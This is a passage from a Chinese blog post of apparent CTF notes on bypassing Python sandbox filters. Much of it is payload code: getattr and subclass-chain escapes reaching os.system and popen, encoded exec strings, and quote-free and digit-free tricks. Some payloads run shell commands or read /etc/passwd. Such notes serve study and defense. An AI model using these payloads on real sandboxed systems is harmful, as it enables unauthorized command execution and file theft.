</span><br></pre></td></tr></table></figure>
<h4 id="函数名字符串扫描过滤的绕过-通过getattr-来字符串操作">函数名字符串扫描过滤的绕过(通过<code>getattr()</code>来字符串操作)</h4>
<p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p>
<p>这里就可以使用： <code>getattr</code> 、<code>__getattribute__</code></p>
<ul>
<li><strong>用法</strong>：
<ul>
<li><code>getattr</code> 是一个函数，用于获取属性，通常用于动态属性访问，提供了更高层次的抽象和便利。</li>
<li><code>__getattribute__</code> 是对象的内置<code>方法</code>，它用于在访问<code>对象</code>的<code>任何属性</code>时自动调用。这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>) <span class="comment"># py2 的decode不用我多说</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 注意，在使用文件路径import os后：execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)，这个方法会报错，改成</span></span><br><span class="line"><span class="comment"># 直接用os.__getattribute__(&quot;metsys&quot;[::-1])(&#x27;ls&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。<br>
如果某个类定义了 getattribute() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）</p>
</blockquote>
<p>runoob ：<a class="link"   href="http://www.runoob.com/python/python-func-getattr.html" >http://www.runoob.com/python/python-func-getattr.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="恢复-sys-modules">恢复 <code>sys.modules</code></h4>
<p>一些过滤中可能将 <code>sys.modules['os']</code> 进行修改,这个时候即使将 os 模块导入进来,也是无法使用的.</p>
<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<p>由于 import 导入模块时会检查 sys.modules 中<code>是否已经有这个类</code>，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可。</p>
<p>或者说，我们这一步：<code>del sys.modules['os']</code>已经把<code>os</code>设置成一个字符串了，看报错就知道</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span><br></pre></td></tr></table></figure>
<p><code>os</code>已经变成一个字符串类了，所以删了重导就行了</p>
<h4 id="基于继承链获取（object类）">基于继承链获取（object类）</h4>
<p>在清空了 <code>__builtins__</code>的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。</p>
<p>py2跟py3不一样</p>
<p>py2里面<code>file</code></p>
<p>py3里面可以用<code>os._wrap_close</code></p>
<p><strong>通过mro方法获取继承关系</strong></p>
<p>payload:（py2）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;flag&quot;).read()&#x27;</span> ) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[0].__subclasses__()[59]</span></span><br><span class="line"><span class="string">&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line"><span class="string">注意，py2里面的func_globals在py3重写成__globals__了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 可以执行命令寻找subclasses下引入过os模块的模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload（py3）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># warnings.catch_warnings也可以用，不过要重找</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>不能直接在模块的 <code>__globals__</code> 字典中，而是在 <code>__builtins__</code> 字典中找。</p>
<h4 id="字符串拼接">字符串拼接</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>当然，如果过滤的是 <code>__class__</code> 或者 <code>__mro__</code> 这样的属性名，就无法采用变形来绕过了。</p>
<h4 id="base64-变形">base64 变形</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)] (<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="逆序">逆序</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意 exec 与 eval 在执行上有所差异。</p>
<h4 id="进制转换">进制转换</h4>
<p>八进制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess</span></span><br><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 16进制</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>其他编码</strong></p>
<p>hex、rot13、base32 等。</p>
<h4 id="过滤了属性名或者函数名：">过滤了属性名或者函数名：</h4>
<p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如 <strong>class</strong>、<strong>import</strong> 等。</p>
<h4 id="getattr-函数">getattr 函数</h4>
<p>getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>, name[, default]) </span><br></pre></td></tr></table></figure>
<p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure>
<p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p>
<h4 id="getattribute-函数">__getattribute__ 函数</h4>
<p><code>getattr</code> 函数在调用时，实际上就是调用这个类的 <code>__getattribute__</code> 方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.\__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line">os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line">__getattr__ 函数</span><br></pre></td></tr></table></figure>
<p><strong>getattr</strong> 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 AttributeError 异常。</p>
<p>如下是 <strong>getattr</strong> 方法的基本形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure>
<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
<p>与 _<em>getattribute</em>_ 不同，<strong>getattr</strong> 只有在属性查找失败时才会被调用，这使得 <strong>getattribute</strong> 可以用来更为全面地控制属性访问。</p>
<p>如果在一个类中同时定义了 <strong>getattr</strong> 和 <strong>getattribute</strong>，那么无论属性是否存在，<strong>getattribute</strong> 都会被首先调用。只有当 <strong>getattribute</strong> 抛出 AttributeError 异常时，<strong>getattr</strong> 才会被调用。</p>
<blockquote>
<p>另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性。</p>
</blockquote>
<h4 id="globals-替换"><em>_globals</em>_ 替换</h4>
<p><strong>globals</strong> 可以用 func_globals 直接替换；</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>__mro__、__bases__、__base__互换</p>
<p>三者之间可以相互替换</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure>
<h4 id="过滤-import">过滤 import</h4>
<p>python 中除了可以使用 import 来导入，还可以使用 _<em>import</em>_ 和 <code>importlib.import_module</code> 来导入模块</p>
<p><em>_import</em>_</p>
<p><em>_import</em>_(‘os’)<br>
<code>importlib.import_module</code></p>
<p>注意：importlib 需要进行导入之后才能够使用,所以有些鸡肋。。。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="loader-load-module">__loader__.load_module</h4>
<p>如果使用 <code>audithook</code> 的方式进行过滤,上面的两种方法就无法使用了,但是 <strong>loader</strong>.load_module 底层实现与 import 不同, 因此某些情况下可以绕过.</p>
<p><strong>loader</strong>.load_module(‘os’)<br>
&lt;module ‘os’ (built-in)&gt;</p>
<h4 id="绕过"><code>[]</code>绕过</h4>
<p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p>
<h5 id="调用-getitem-函数直接替换；">调用__getitem__()函数直接替换；</h5>
<p>调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>) <span class="comment">#py2</span></span><br></pre></td></tr></table></figure>
<h5 id="getitem-替换中括号"><strong>getitem</strong>()替换中括号[]</h5>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="pop-替换中括号-，结合-getitem-利用">pop()替换中括号[]，结合__getitem__()利用</h5>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-2"><code>''</code>绕过</h4>
<h5 id="str-函数">str 函数</h5>
<p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="chr-函数">chr 函数</h5>
<p>也可以使用 chr 加数字来构造字符串</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="list-dict">list + dict</h5>
<p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] </span><br></pre></td></tr></table></figure>
<h5 id="doc"><em>_doc</em>_</h5>
<p><em>_doc</em>_ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br></pre></td></tr></table></figure>
<h5 id="bytes-函数">bytes 函数</h5>
<p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 <code>decode</code> 则可以得到字符串**(python2)**</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode() </span><br></pre></td></tr></table></figure>
<h4 id="绕过-3"><code>+</code>绕过</h4>
<p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 <code>join</code> 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <em>_doc</em>_ 中取，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>().join(().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]) </span><br></pre></td></tr></table></figure>
<h4 id="数字绕过">数字绕过</h4>
<p>如果过滤了数字的话，可以使用一些函数的返回值获取。</p>
<p>例如：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([]))、Flase、<span class="built_in">len</span>([])、<span class="built_in">any</span>(())</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([<span class="string">&quot;&quot;</span>]))、<span class="literal">True</span>、<span class="built_in">all</span>(())、<span class="built_in">int</span>(<span class="built_in">list</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(a၁=())).pop()).pop())</span><br></pre></td></tr></table></figure>
<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 ** 0 == 1 </span><br><span class="line">1 + 1 == 2 </span><br><span class="line">2 + 1 == 3 </span><br><span class="line">2 ** 2 == 4 </span><br></pre></td></tr></table></figure>
<p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure>
<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure>
<p>第四种方法: unicode 会在后续的 unicode 绕过中介绍</p>
<h4 id="空格绕过">空格绕过</h4>
<p>通过 ()、[] 替换</p>
<h4 id="运算符绕过">运算符绕过</h4>
<p>== 可以用 in 来替换</p>
<p>or 可以用 + 、-、|来替换</p>
<p>例如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>and 可以用&amp;、 *替代</p>
<p>例如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span 